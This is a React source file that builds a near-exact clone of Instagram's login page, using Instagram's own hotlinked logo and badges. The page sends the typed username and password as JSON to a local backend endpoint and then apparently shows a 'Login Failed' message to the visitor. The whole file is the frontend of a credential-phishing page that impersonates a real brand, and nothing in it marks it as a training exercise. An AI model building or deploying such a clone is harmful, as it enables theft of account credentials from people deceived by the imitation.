import React, { useState } from 'react';
import './App.css';

const InstagramWordmark = () => (
  <img
    src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_wordmark_white.svg"
    alt="Instagram"
    className="insta-wordmark"
    draggable="false"
    style={{ margin: '36px 0 24px 0', width: 175, height: 51 }}
  />
);

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginFailed, setLoginFailed] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setLoginFailed(false);
    try {
      const res = await fetch('http://localhost:5000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();
      if (data.success) {
        // Success (not required)
      } else {
        setLoginFailed(true);
      }
    } catch (err) {
      setLoginFailed(true);
    }
    setLoading(false);
  };

  if (loginFailed) {
    return (
      <div className="insta-bg">
        <div className="insta-center">
          <div className="insta-box">
            <InstagramWordmark />
            <div className="insta-failed-message">
              <h2>Login Failed</h2>
              <p>The username or password you entered is incorrect.</p>
              <button onClick={() => setLoginFailed(false)}>Try Again</button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="insta-bg">
      <div className="insta-center">
        <div className="insta-box">
          <InstagramWordmark />
          <form className="insta-form" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              value={username}
              onChange={e => setUsername(e.target.value)}
              autoComplete="username"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={e => setPassword(e.target.value)}
              autoComplete="current-password"
              required
            />
            <button type="submit" disabled={loading}>{loading ? 'Logging in...' : 'Log In'}</button>
          </form>
          <div className="insta-or">
            <div className="insta-line" />
            <span>OR</span>
            <div className="insta-line" />
          </div>
          <div className="insta-facebook-login">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/ye/r/UtJtFmFLCiD.png" alt="Facebook" />
            <span>Log in with Facebook</span>
          </div>
          <a href="#" className="insta-forgot">Forgot password?</a>
        </div>
        <div className="insta-signup-box">
          <span>Don't have an account?</span>
          <a href="#">Sign up</a>
        </div>
        <div className="insta-apps">
          <span>Get the app.</span>
          <div className="insta-app-buttons">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="Get it on App Store" />
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff4c484c.png" alt="Get it on Google Play" />
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_microsoft_english_en.png/3cd8a5c7c6b3.png" alt="Get it from Microsoft" />
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
